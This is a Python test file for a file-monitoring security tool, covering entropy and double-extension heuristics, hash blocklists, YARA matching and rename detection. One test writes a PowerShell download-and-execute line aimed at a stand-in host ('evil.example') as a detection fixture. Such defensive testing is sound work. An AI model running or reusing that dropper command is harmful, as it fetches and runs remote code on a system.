import time
from pathlib import Path

import pytest
from sqlalchemy import select

from config.settings import MonitoringConfig, RiskConfig
from database.engine import create_db_engine, create_session_factory
from database.models import Base, BlocklistEntry, Event, FileRecord
from detection.file_analysis import analyze_file, check_double_extension, check_high_entropy, file_category
from detection.yara_engine import YaraEngine
from monitors.file_monitor import FileMonitor, _FileEvent, default_watch_paths


RISK = RiskConfig()


def test_file_category_detects_each_type() -> None:
    assert file_category(Path("setup.exe")) == "executable"
    assert file_category(Path("script.ps1")) == "script"
    assert file_category(Path("lib.dll")) == "dll"
    assert file_category(Path("readme.txt")) is None


def test_double_extension_trick_is_flagged() -> None:
    finding = check_double_extension(Path("invoice.pdf.exe"))
    assert finding is not None
    assert "disguises" in finding.reason


def test_double_extension_not_flagged_for_normal_exe() -> None:
    assert check_double_extension(Path("setup.exe")) is None


def test_high_entropy_content_is_flagged() -> None:
    import os

    random_bytes = os.urandom(4096)  # high entropy by construction
    finding = check_high_entropy(random_bytes)
    assert finding is not None


def test_low_entropy_content_is_not_flagged() -> None:
    finding = check_high_entropy(b"a" * 4096)
    assert finding is None


def test_analyze_new_script_is_low_risk_by_default() -> None:
    analysis = analyze_file(
        path=Path("installer.ps1"), event_type="created", sample=b"Write-Host 'hello'", known_malicious_hash=False, risk_config=RISK
    )
    assert analysis.risk == 10
    assert analysis.severity == "informational"
    assert analysis.known_malicious is False


def test_analyze_modification_scores_higher_than_creation() -> None:
    created = analyze_file(path=Path("tool.exe"), event_type="created", sample=None, known_malicious_hash=False, risk_config=RISK)
    modified = analyze_file(path=Path("tool.exe"), event_type="modified", sample=None, known_malicious_hash=False, risk_config=RISK)
    assert modified.risk > created.risk


def test_known_malicious_hash_short_circuits_to_high_risk() -> None:
    analysis = analyze_file(
        path=Path("readme.txt.exe"), event_type="created", sample=b"anything", known_malicious_hash=True, risk_config=RISK
    )
    assert analysis.known_malicious is True
    assert analysis.risk == 95
    assert analysis.severity == "critical"
    # Known-hash match short-circuits -- other heuristics (double
    # extension etc.) aren't also appended.
    assert len(analysis.reasons) == 1


def test_default_watch_paths_only_returns_existing_directories() -> None:
    paths = default_watch_paths()
    assert all(p.exists() and p.is_dir() for p in paths)


@pytest.fixture()
def session_factory(tmp_path: Path):
    engine = create_db_engine(tmp_path / "test.db")
    Base.metadata.create_all(engine)
    return create_session_factory(engine)


@pytest.fixture()
def watch_dir(tmp_path: Path) -> Path:
    d = tmp_path / "watched"
    d.mkdir()
    return d


def _no_yara() -> YaraEngine:
    # Point at an empty directory so no rules load, isolating these
    # tests from the bundled yara/ rules.
    import tempfile

    return YaraEngine(rules_dir=Path(tempfile.mkdtemp()))


def test_write_one_persists_file_record_and_event(session_factory, watch_dir: Path) -> None:
    monitor = FileMonitor(
        session_factory, MonitoringConfig(), RISK, watch_paths=[watch_dir], yara_engine=_no_yara()
    )
    script = watch_dir / "installer.ps1"
    script.write_text("Write-Host hi")

    with session_factory() as session:
        monitor._write_one(session, _FileEvent(path=str(script), event_type="created"))
        session.commit()

        record = session.execute(select(FileRecord).where(FileRecord.filename == "installer.ps1")).scalars().one()
        assert record.event_type == "created"
        assert record.file_type == "script"
        assert record.sha256 is not None

        event = session.execute(select(Event).where(Event.event_type == "file_created")).scalars().one()
        assert event.source == "file_monitor"
        assert event.details["path"] == str(script)


def test_write_one_detects_known_malicious_hash(session_factory, watch_dir: Path) -> None:
    malware = watch_dir / "bad.exe"
    malware.write_bytes(b"totally-not-malware-just-test-bytes")

    import hashlib

    sha256 = hashlib.sha256(malware.read_bytes()).hexdigest()

    with session_factory() as session:
        session.add(BlocklistEntry(entry_type="hash", value=sha256, reason="test feed"))
        session.commit()

    monitor = FileMonitor(
        session_factory, MonitoringConfig(), RISK, watch_paths=[watch_dir], yara_engine=_no_yara()
    )
    with session_factory() as session:
        monitor._write_one(session, _FileEvent(path=str(malware), event_type="created"))
        session.commit()

        record = session.execute(select(FileRecord).where(FileRecord.filename == "bad.exe")).scalars().one()
        assert record.severity == "critical"
        assert record.risk_score == 95


def test_write_one_yara_match_boosts_risk_and_adds_reason(session_factory, watch_dir: Path) -> None:
    script = watch_dir / "dropper.ps1"
    script.write_text('IEX(New-Object Net.WebClient).DownloadString("http://evil.example") -EncodedCommand')

    monitor = FileMonitor(session_factory, MonitoringConfig(), RISK, watch_paths=[watch_dir])
    assert monitor._yara_engine.available

    with session_factory() as session:
        monitor._write_one(session, _FileEvent(path=str(script), event_type="created"))
        session.commit()

        event = session.execute(select(Event).where(Event.event_type == "file_created")).scalars().one()
        assert any("YARA rule" in r for r in event.details["reasons"])
        assert event.risk_score >= 50


def test_handler_treats_rename_into_tracked_extension_as_created(session_factory, watch_dir: Path) -> None:
    # Mirrors a real download pattern: a file lands under a
    # non-tracked temp name, then gets renamed to its final tracked
    # extension -- watchdog reports this as on_moved, not on_created.
    seen = []
    monitor = FileMonitor(
        session_factory, MonitoringConfig(), RISK, watch_paths=[watch_dir], yara_engine=_no_yara()
    )
    # _Handler captures the on_event callback at construction time, so
    # patch it directly rather than monitor._writer.put (which the
    # handler no longer refers to once constructed).
    monitor._handler._on_event = lambda item: seen.append(item)

    src = str(watch_dir / "download.tmp")
    dest = str(watch_dir / "installer.exe")
    fake_event = type("E", (), {"is_directory": False, "src_path": src, "dest_path": dest})()
    monitor._handler.on_moved(fake_event)

    assert len(seen) == 1
    assert seen[0].path == dest
    assert seen[0].event_type == "created"


def test_handler_ignores_untracked_extensions(session_factory, watch_dir: Path) -> None:
    seen = []
    monitor = FileMonitor(
        session_factory, MonitoringConfig(), RISK, watch_paths=[watch_dir], yara_engine=_no_yara()
    )
    monitor._handler._on_event = lambda item: seen.append(item)

    (watch_dir / "notes.txt").write_text("just notes")
    monitor._handler.on_created(type("E", (), {"is_directory": False, "src_path": str(watch_dir / "notes.txt")})())
    assert seen == []


def test_file_monitor_detects_a_real_rename_into_tracked_extension(tmp_path: Path) -> None:
    """End-to-end: the exact pattern live testing caught -- a file
    dropped under a non-tracked name, then renamed to a tracked
    extension, must still be detected (via on_moved)."""
    engine = create_db_engine(tmp_path / "test.db")
    Base.metadata.create_all(engine)
    session_factory = create_session_factory(engine)

    watch_dir = tmp_path / "watched"
    watch_dir.mkdir()

    monitor = FileMonitor(
        session_factory, MonitoringConfig(), RiskConfig(), watch_paths=[watch_dir], yara_engine=_no_yara()
    )
    monitor.start()
    try:
        src = watch_dir / "download.part"
        dest = watch_dir / "free_gift_card.exe"
        src.write_bytes(b"MZ" + b"\x00" * 100)
        src.rename(dest)

        deadline = time.monotonic() + 5.0
        found = False
        while time.monotonic() < deadline:
            with session_factory() as session:
                match = session.execute(
                    select(FileRecord).where(FileRecord.filename == "free_gift_card.exe")
                ).scalars().first()
                if match is not None:
                    found = True
                    break
            time.sleep(0.2)
        assert found, "expected the renamed file to be recorded via on_moved"
    finally:
        monitor.stop()


def test_file_monitor_detects_a_real_created_file(tmp_path: Path) -> None:
    """End-to-end: start the real watchdog observer and confirm it
    picks up an actual file creation on disk."""
    engine = create_db_engine(tmp_path / "test.db")
    Base.metadata.create_all(engine)
    session_factory = create_session_factory(engine)

    watch_dir = tmp_path / "watched"
    watch_dir.mkdir()

    monitor = FileMonitor(session_factory, MonitoringConfig(), RiskConfig(), watch_paths=[watch_dir], yara_engine=_no_yara())
    monitor.start()
    try:
        target = watch_dir / "suspicious.exe"
        target.write_bytes(b"MZ" + b"\x00" * 100)

        deadline = time.monotonic() + 5.0
        found = False
        while time.monotonic() < deadline:
            with session_factory() as session:
                match = session.execute(
                    select(FileRecord).where(FileRecord.filename == "suspicious.exe")
                ).scalars().first()
                if match is not None:
                    found = True
                    break
            time.sleep(0.2)
        assert found, "expected the created file to be recorded"
    finally:
        monitor.stop()
